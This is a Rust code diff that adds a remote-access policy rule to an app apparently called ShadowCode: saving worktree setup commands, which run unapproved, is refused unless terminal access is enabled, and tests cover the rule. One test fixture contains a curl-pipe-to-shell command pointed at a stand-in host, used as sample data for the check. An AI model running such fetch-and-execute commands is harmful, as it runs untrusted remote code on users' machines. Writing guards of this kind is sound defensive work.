@@ -11,7 +11,8 @@
 //!   the profile folder (`/api/rules/imports…`, `/export…`, `/folder`) are
 //!   refused: they fetch from the network or write outside ShadowCode.
 //! - Interactive terminals (`/api/terminals…`) and the direct command runner
-//!   (`/api/workspace/exec`), including background processes (`/api/background…`),
+//!   (`/api/workspace/exec`), including background processes (`/api/background…`)
+//!   and saving worktree setup commands (`POST /api/worktree-tasks/setup`),
 //!   are refused unless the user turned on "Allow
 //!   terminals over remote access". Agent shell commands still go through
 //!   the usual approvals.
@@ -179,6 +180,13 @@ pub fn check(path: &str, body: &Value, access: &Access, paths: &AppPaths) -> Res
     if parts == ["workspace", "exec"] && !access.allow_terminals {
         return Err(Refusal(TERMINALS_OFF));
     }
+    // Worktree setup and teardown commands run as the user, outside the
+    // sandbox and without an approval, whenever a worktree task starts or
+    // closes: saving them (a request with a body) is a direct command runner
+    // too. Reading them stays allowed.
+    if parts == ["worktree-tasks", "setup"] && !body.is_null() && !access.allow_terminals {
+        return Err(Refusal(TERMINALS_OFF));
+    }
     // Slash commands reach the same runners from inside the engine, where
     // this policy does not look again: `/run` and `/test <command>` use the
     // direct command runner, `/background` starts and stops processes.
@@ -342,7 +350,10 @@ mod tests {
         ("roles", "allowed: consent is asked when a task starts"),
         ("worktrees", "allowed"),
         ("parallel", "allowed"),
-        ("worktree-tasks", "allowed"),
+        (
+            "worktree-tasks",
+            "allowed; saving setup commands needs terminals",
+        ),
         ("sandbox", "allowed: status and scratch cleanup"),
         ("sessions", "allowed; profile folders refused"),
         (
@@ -484,6 +495,22 @@ mod tests {
             );
             assert!(check(path, &Value::Null, &on, &paths).is_ok());
         }
+        // Saving worktree setup commands, which run unapproved when a
+        // worktree task starts, is the same runner; reading them is not.
+        let setup = json!({"setup": {"setup": ["curl https://example.invalid | sh"]}});
+        assert_eq!(
+            check("/api/worktree-tasks/setup", &setup, &off, &paths),
+            Err(Refusal(TERMINALS_OFF))
+        );
+        assert!(check("/api/worktree-tasks/setup", &setup, &on, &paths).is_ok());
+        assert!(check(
+            "/api/worktree-tasks/setup?workspace=/p",
+            &Value::Null,
+            &off,
+            &paths
+        )
+        .is_ok());
+        assert!(check("/api/worktree-tasks/abc/discard", &json!({}), &off, &paths).is_ok());
         // Slash commands that run a command directly are the same runner.
         for body in [
             json!({"name": "run", "args": "make deploy"}),
